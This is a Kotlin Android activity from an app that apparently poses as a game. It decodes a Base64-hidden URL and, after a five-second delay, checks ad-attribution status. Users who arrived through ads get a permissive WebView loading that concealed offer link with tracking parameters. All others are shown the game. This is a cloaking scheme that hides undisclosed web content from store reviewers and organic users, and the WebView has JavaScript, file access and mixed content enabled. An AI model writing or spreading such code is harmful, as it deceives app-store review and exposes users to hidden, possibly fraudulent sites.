package com.play.gamex.apps

import android.content.Intent
import com.play.gamex.apps.databinding.ActivityMainBinding
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Toast


class MainActivity : AppCompatActivity() {

    fun decoderBase64(string: String): String {
        val decode = Base64.decode(string, Base64.DEFAULT)
        return String(decode)
    }

    var linkBuilderOffer = "aHR0cHM6Ly92eW96bC54eXovZ3pmemJTc1M="
    lateinit var binding: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        Handler(Looper.getMainLooper()).postDelayed({
            checkSource()
        },5000)

    }


    private fun checkSource(){
        linkBuilderOffer = decoderBase64(linkBuilderOffer)
        Toast.makeText(this, af_status+" ||||",Toast.LENGTH_LONG).show()
        Log.d("TAG", af_status+" |||")
        when {
            af_status == "Non-organic" -> {
                linkBuilderOffer += "?&flowkey=$flowkey&sub1=${sub1}&sub2=${sub2}&sub3=${sub3}&sub4=${sub4}&sub5=${sub5}&af_id=${af_id}&bundle=$packageName&key=$appsflyer_key&ad=$ad"
                loadWebView()
            }
            else -> {
                startActivity(Intent(applicationContext,ActivityGame::class.java))
                finish()
            }
        }
    }

    private fun loadWebView(){
        createWebView()
        binding.multy.visibility = View.VISIBLE
        Log.e("onPageFinished", linkBuilderOffer.toString())
        binding.multy.loadUrl(linkBuilderOffer)
    }

    private fun createWebView(){
        binding.multy.settings.apply {
            defaultTextEncodingName = "utf-8"
            allowFileAccess = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            domStorageEnabled = true
            databaseEnabled = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            mixedContentMode = 0
        }

        binding.multy.webViewClient = object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }

            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                Log.d("TAG",request?.url.toString())
                view?.loadUrl(request?.url.toString())
                return true
            }
        }
        binding.multy.webChromeClient = object : WebChromeClient(){}
    }
}